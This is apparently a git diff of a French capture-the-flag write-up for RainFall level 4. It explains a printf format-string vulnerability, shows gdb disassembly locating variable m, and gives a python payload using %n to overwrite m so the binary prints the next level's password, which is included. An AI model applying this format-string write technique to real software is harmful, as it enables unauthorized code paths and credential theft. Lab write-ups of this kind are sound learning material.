@@ -1,32 +1,7 @@
 # Level 4
 
 Nous avons un exécutable similaire au niveau précédent.
-Décompilons:
-```
-void p(char *param_1)
-{
-  printf(param_1);
-  return;
-}
 
-void n(void)
-{
-  char local_20c [520];
-
-  fgets(local_20c,0x200,stdin);
-  p(local_20c);
-  if (m == 0x1025544) {
-    system("/bin/cat /home/user/level5/.pass");
-  }
-  return;
-}
-
-void main(void)
-{
-  n();
-  return;
-}
-```
 Cette fois-ci le code est séparé en 3 fonctions, et le printf est dans une fonction a part.
 Le code affiche toujours stdin sur stdout.Nous allons utiliser la faille de printf comme precedemment.
 Trouvons les adresses que nous avons besoin avec gdb.
@@ -45,7 +20,7 @@ Dump of assembler code for function n:
    0x0804847f <+40>:	lea    -0x208(%ebp),%eax
    0x08048485 <+46>:	mov    %eax,(%esp)
    0x08048488 <+49>:	call   0x8048444 <p>
-   0x0804848d <+54>:	mov    0x8049810,%eax
+   0x0804848d <+54>:	mov    0x8049810,%eax <== adresse de m
    0x08048492 <+59>:	cmp    $0x1025544,%eax
    0x08048497 <+64>:	jne    0x80484a5 <n+78>
    0x08048499 <+66>:	movl   $0x8048590,(%esp)
@@ -71,6 +46,7 @@ python -c 'print("\x10\x98\x04\x08" + "%16930111x" + " %12$n")' > /tmp/exploit1
 0x1025544 aurait du faire en décimal 16930116 - 4 = 16930112. Sur gdb ca fonctionnait mais en dehors de gdb pour l'exécution j'ai du mettre "16930111".
 ```
 level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%16930111x" + " %12$n")' > /tmp/exploit1
-                                                                               b7ff26b0
+cat /tmp/exploit1 | /home/user/level4/level4
+                                                                                b7ff26b0
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
